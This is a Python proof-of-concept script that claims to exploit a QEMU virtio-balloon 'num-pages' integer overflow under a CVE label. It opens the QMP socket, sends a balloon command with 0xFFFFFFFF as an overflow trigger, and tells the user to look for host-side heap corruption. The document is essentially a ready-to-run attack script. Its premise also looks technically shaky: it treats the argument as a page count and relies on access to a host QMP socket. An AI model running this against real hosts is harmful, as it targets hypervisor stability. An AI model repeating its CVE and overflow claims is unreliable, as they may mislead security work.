#!/usr/bin/env python3
"""
PoC for QEMU virtio‐balloon “num‐pages” overflow (CVE-2019-14858)

Uses QMP to inflate the guest’s balloon device with an
oversized page_count, triggering an integer overflow /
heap corruption in QEMU’s balloon backend.
"""

import socket
import json
import time

QMP_SOCK = "/tmp/qemu-qmp-sock"

def qmp_send(sock, obj):
    data = json.dumps(obj).encode() + b"\n"
    sock.sendall(data)
    resp = sock.recv(4096)
    return json.loads(resp.decode())

def main():
    # 1) connect QMP
    s = socket.socket(socket.AF_UNIX)
    s.connect(QMP_SOCK)
    print("[+] connected to QMP")

    # 2) negotiate
    print("[+] negotiating QMP capabilities")
    print(qmp_send(s, {"execute": "qmp_capabilities"}))

    # 3) send balloon inflate with huge page count
    huge_pages = 0xFFFFFFFF      # overflow trigger
    cmd = {
      "execute": "balloon",
      "arguments": {
        "value": huge_pages
      }
    }
    print(f"[+] inflating balloon to {huge_pages} pages")
    resp = qmp_send(s, cmd)
    print("[+] QMP response:", resp)

    # wait for corruption/crash
    time.sleep(2)
    print("[!] check QEMU process for host‐side heap corruption")
    s.close()

if __name__ == "__main__":
    main()